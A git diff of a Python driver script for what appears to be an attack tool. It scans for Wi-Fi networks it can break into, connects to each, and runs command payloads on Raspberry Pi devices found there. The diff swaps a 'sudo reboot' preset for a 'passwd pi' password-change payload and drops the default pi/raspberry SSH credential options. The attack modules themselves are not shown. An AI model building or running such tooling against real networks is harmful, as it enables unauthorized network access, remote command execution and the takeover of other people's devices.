@@ -1,29 +1,23 @@
 import argparse
 from rpi.hunter import let_the_hunt_begin
 from network_buster.buster import bust, connect_to_network
-from termcolor import colored, cprint
+from termcolor import colored
 import platform
 
 parser = argparse.ArgumentParser()
 parser.add_argument('--list', action='store_true',
 					help='List available payloads')
-parser.add_argument('-u', dest='user', type=str, default='pi',
-					help='Username to use when SSH\'ing')
-parser.add_argument('-c', dest='creds', type=str, default='raspberry',
-					help='Credentials (password) to use when SSH\'ing')
-
 parser.add_argument('--payload', type=str, default='whoami',
-					help='(Name of, or raw) payload [ex. reboot or \'whoami\']')
+					help='(Name of, or raw) payload [ex. password or \'whoami\']')
 
 args = parser.parse_args()
 
 payloads = {
-	'reboot': 'sudo reboot',
+	'password': '"passwd pi"'
 }
 
 # List available payloads.
 def list_payloads():
-	l = 0
 	print("Available preset payloads:")
 	print(f"Specify with {colored('--payload name', 'green')}")
 	for key, value in payloads.items():
@@ -42,6 +36,7 @@ def intro():
 
 intro()
 
+print("Searching for vulnerable networks...")
 successful_networks = bust()
 
 if successful_networks:
@@ -50,11 +45,10 @@ if successful_networks:
 	else:
 		payload = args.payload
 
-	print("")
-
 	for network in successful_networks:
 		print(f"Beginning the hunt on {network['network']}...")
 		connect_to_network(network['network'], network['password'], platform.system())
 		let_the_hunt_begin(payload)
+		print("")
 elif args.list:
 	list_payloads()
